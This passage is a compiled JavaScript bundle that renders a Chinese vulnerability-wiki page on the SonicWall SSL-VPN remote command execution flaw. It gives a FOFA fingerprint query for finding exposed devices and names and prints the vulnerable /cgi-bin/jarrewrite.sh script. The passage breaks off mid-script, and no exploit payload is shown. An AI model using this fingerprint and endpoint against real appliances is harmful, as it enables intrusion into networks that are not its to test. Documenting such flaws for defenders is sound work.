(window.webpackJsonp=window.webpackJsonp||[]).push([[256],{1348:function(s,a,t){s.exports=t.p+"assets/img/son-1.bc280134.png"},1349:function(s,a,t){s.exports=t.p+"assets/img/son-2.6282432e.png"},2465:function(s,a,t){"use strict";t.r(a);var n=t(75),e=Object(n.a)({},(function(){var s=this,a=s.$createElement,n=s._self._c||a;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"sonicwall-ssl-vpn-远程命令执行漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#sonicwall-ssl-vpn-远程命令执行漏洞"}},[s._v("#")]),s._v(" SonicWall SSL-VPN 远程命令执行漏洞")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("SonicWall SSL-VPN 远程命令执行在1月24日被公开 EXP，此设备存在远程命令执行漏洞")]),s._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("SonicWall SSL-VPN")]),n("br"),s._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v('app="SONICWALL-SSL-VPN"')]),n("br"),s._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("出现漏洞的文件为 "),n("code",[s._v("/cgi-bin/jarrewrite.sh")])]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[n("span",{pre:!0,attrs:{class:"token shebang important"}},[s._v("#!/bin/bash")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# jarrewrite.sh:")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Script takes a jar/class file and a working directory; modifies class files")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# within the jar and repackages them.")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("USAGE_STR")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Usage: '),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$0")]),s._v(' <jar/class file> <path-to-working directory>"')]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Validate number of args")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$#")]),s._v(" -ne "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("then")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${USAGE_STR}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v(" -1"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("fi")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token for-or-select variable"}},[s._v("param")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$*")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$param")]),s._v('"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-h"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("then")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${USAGE_STR}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("fi")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("done")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# constants")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("BOUNDARY")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-------------------------------------------------------------"')]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("BASE_DIR")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/tmp\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("JAVA_SRC")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$1")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("WDIR")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$2")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("CWD")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("pwd")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("FULL_JAVA_SRC_PATH")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${BASE_DIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${WDIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${JAVA_SRC}")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("CLASSES_DIR")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("classes\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("META_INF_DIR")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${BASE_DIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${WDIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${CLASSES_DIR}")]),s._v("/META-INF\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("MANIFEST")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${META_INF_DIR}")]),s._v("/MANIFEST.MF\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("MANIFEST_DIGEST_FILE")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${META_INF_DIR}")]),s._v("/SWALL_SIGNATURE.SF\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("SIGNATURE_FILE")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${META_INF_DIR}")]),s._v("/SWALL_SIGNATURE.DSA\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("CODESIGNER_CRT")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("./"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("/var/cs_cert/httprpCodeSignerX509Crt.pem\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("CODESIGNER_PVTKEY")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("./"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("/var/cs_cert/httprpCodeSignerPvtkey.pem\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("DO_SIGN")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v(" -f  "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${FULL_JAVA_SRC_PATH}")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("then")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"File not found: '),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${FULL_JAVA_SRC_PATH}")]),s._v('"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v(" -2"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("fi")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${JAVA_SRC"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("##")]),s._v("*.}")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"jar"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Using bracket in variable substitution.")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("then")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# organize")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${BASE_DIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$WDIR")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$CLASSES_DIR")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# unzip jar")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("unzip")]),s._v(" -d "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${BASE_DIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${WDIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${CLASSES_DIR}")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${FULL_JAVA_SRC_PATH}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Simple sanity check to see if the JAR has already been signed. ")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# FIXME: This is not a complete check,because the original JAR signature ")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# has to be verified completely otherwise a malicious applet")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# could access the local resources with SSL VPN signing it.")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("old_sf_files")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v("/bin/ls $"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("META_INF_DIR"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("/*."),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("sS"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("fF"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("old_sign_files")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v("/bin/ls $"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("META_INF_DIR"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("/*."),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("rRdD"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("sS"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("aA"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token for-or-select variable"}},[s._v("sf_file")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$old_sf_files")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v("\n\t"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token for-or-select variable"}},[s._v("sign_file")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$old_sign_files")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("DO_SIGN")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("break")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("done")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("break")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("done")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# remove all manifest info including signatures")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# remove all that match mf|MF|sf|SF or dsa|DSA|rsa|RSA")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" -f "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${BASE_DIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${WDIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${CLASSES_DIR}")]),s._v("/META-INF/*."),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("sSmM"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("fF"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${BASE_DIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${WDIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${CLASSES_DIR}")]),s._v("/META-INF/*.?"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("sS"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("aA"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("OUTPUT_JAR")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${FULL_JAVA_SRC_PATH}")]),s._v('"')]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("classfiles")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v("/usr/bin/find $"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("BASE_DIR"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("/$"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("WDIR"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("/$"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("CLASSES_DIR"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(" -type f"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#New Manifest file")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("MANIFEST_MAIN_ATTR")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Manifest-Version: 1.0'),n("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("Created-By: 1.0 (SonicWALL Inc.)"),n("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" -e "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Creating Manifest file ... "')]),s._v(" \n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" -e "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${MANIFEST_MAIN_ATTR}")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${MANIFEST}")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token for-or-select variable"}},[s._v("file")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$classfiles")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v("\n\t"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$BOUNDARY")]),s._v("\n\t"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),s._v("\n\t"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$BOUNDARY")]),s._v("\n\t./jdasm "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),s._v("\n\n\t"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Update manifest file")]),s._v("\n\t"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("SHA1_MANIFEST_ENTRY_CLASS")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token variable"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v("openssl dgst -sha1 -binary $file "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" openssl base64"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v("\n\t"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("MANIFEST_ENTRY")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Name: '),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${file"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("##")]),s._v("${BASE_DIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${WDIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${CLASSES_DIR}")]),s._v("/}"),n("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("SHA1-Digest: "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${SHA1_MANIFEST_ENTRY_CLASS}")]),n("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),s._v("\n\t"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" -e "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${MANIFEST_ENTRY}")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${MANIFEST}")]),s._v("\n\n\t"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$BOUNDARY")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("done")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${DO_SIGN}")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("then")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" -e "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Creating Manifest Signature file and Signature block"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$OUTLOG")]),s._v("\n/usr/sbin/sw_jarsigner -m "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${MANIFEST}")]),s._v(" -s "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${MANIFEST_DIGEST_FILE}")]),s._v(" -S "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${SIGNATURE_FILE}")]),s._v(" -c "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${CODESIGNER_CRT}")]),s._v(" -k "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${CODESIGNER_PVTKEY}")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("fi")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" -f "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${FULL_JAVA_SRC_PATH}")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${BASE_DIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${WDIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${CLASSES_DIR}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("zip")]),s._v(" -r "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${OUTPUT_JAR}")]),s._v(" *\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${CWD}")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# clean")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" -Rf "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${BASE_DIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${WDIR}")]),s._v("/"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${CLASSES_DIR}")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("elif")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${JAVA_SRC"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("##")]),s._v("*.}")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"class"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("then")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# if file is a class")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v(" -e  "),n("span",{pre:!0,attrs:{class:"token 